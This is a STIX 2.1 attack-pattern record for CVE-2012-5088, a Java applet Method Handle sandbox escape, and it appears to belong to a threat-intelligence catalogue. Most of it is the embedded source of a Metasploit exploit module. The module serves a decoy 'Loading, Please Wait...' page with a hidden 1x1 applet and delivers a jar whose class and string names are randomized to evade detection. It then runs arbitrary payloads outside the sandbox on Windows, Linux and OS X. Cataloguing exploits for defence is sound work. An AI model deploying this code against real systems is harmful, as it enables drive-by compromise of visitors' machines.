{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--be513c50-575c-4a31-b48b-fee0ec644437",
    "created": "2024-08-14T17:05:50.823716Z",
    "modified": "2024-08-14T17:05:50.82372Z",
    "name": "Java Applet Method Handle Remote Code Execution",
    "description": " This module abuses the Method Handle class from a Java Applet to run arbitrary Java code outside of the sandbox. The vulnerability affects Java version 7u7 and earlier.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_jre17_method_handle.rb",
            "external_id": "java_jre17_method_handle.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5088"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-explorations.com/materials/SE-2012-01-ORACLE-5.pdf"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-explorations.com/materials/se-2012-01-report.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({ :javascript => false })\n\n  def initialize( info = {} )\n\n    super( update_info( info,\n      'Name'          => 'Java Applet Method Handle Remote Code Execution',\n      'Description'   => %q{\n          This module abuses the Method Handle class from a Java Applet to run arbitrary\n        Java code outside of the sandbox. The vulnerability affects Java version 7u7 and\n        earlier.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Unknown', # Vulnerability discovery at security-explorations.com\n          'juan vazquez' # Metasploit module\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2012-5088' ],\n          [ 'OSVDB', '86352' ],\n          [ 'BID', '56057' ],\n          [ 'URL', 'http://www.security-explorations.com/materials/SE-2012-01-ORACLE-5.pdf' ],\n          [ 'URL', 'http://www.security-explorations.com/materials/se-2012-01-report.pdf' ]\n        ],\n      'Platform'      => %w{ java linux osx win },\n      'Payload'       => { 'Space' => 20480, 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Platform' => ['java'],\n              'Arch' => ARCH_JAVA,\n            }\n          ],\n          [ 'Windows x86 (Native Payload)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Mac OS X x86 (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Linux x86 (Native Payload)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86,\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-10-16'\n    ))\n  end\n\n\n  def setup\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2012-5088\", \"Exploit.class\")\n    @exploit_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2012-5088\", \"B.class\")\n    @loader_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n\n    @exploit_class_name = rand_text_alpha(\"Exploit\".length)\n    @exploit_class.gsub!(\"Exploit\", @exploit_class_name)\n    super\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"handling request for #{request.uri}\")\n\n    case request.uri\n    when /\\.jar$/i\n      jar = payload.encoded_jar\n      jar.add_file(\"#{@exploit_class_name}.class\", @exploit_class)\n      jar.add_file(\"B.class\", @loader_class)\n      metasploit_str = rand_text_alpha(\"metasploit\".length)\n      payload_str = rand_text_alpha(\"payload\".length)\n      jar.entries.each { |entry|\n        entry.name.gsub!(\"metasploit\", metasploit_str)\n        entry.name.gsub!(\"Payload\", payload_str)\n        entry.data = entry.data.gsub(\"metasploit\", metasploit_str)\n        entry.data = entry.data.gsub(\"Payload\", payload_str)\n      }\n      jar.build_manifest\n\n      send_response(cli, jar, { 'Content-Type' => \"application/octet-stream\" })\n    when /\\/$/\n      payload = regenerate_payload(cli)\n      if not payload\n        print_error(\"Failed to generate the payload.\")\n        send_not_found(cli)\n        return\n      end\n      send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })\n    else\n      send_redirect(cli, get_resource() + '/', '')\n    end\n\n  end\n\n  def generate_html\n    html  = %Q|<html><head><title>Loading, Please Wait...</title></head>|\n    html += %Q|<body><center><p>Loading, Please Wait...</p></center>|\n    html += %Q|<applet archive=\"#{rand_text_alpha(8)}.jar\" code=\"#{@exploit_class_name}.class\" width=\"1\" height=\"1\">|\n    html += %Q|</applet></body></html>|\n    return html\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-16",
    "x_mitre_platforms": [
        "linux'"
    ]
}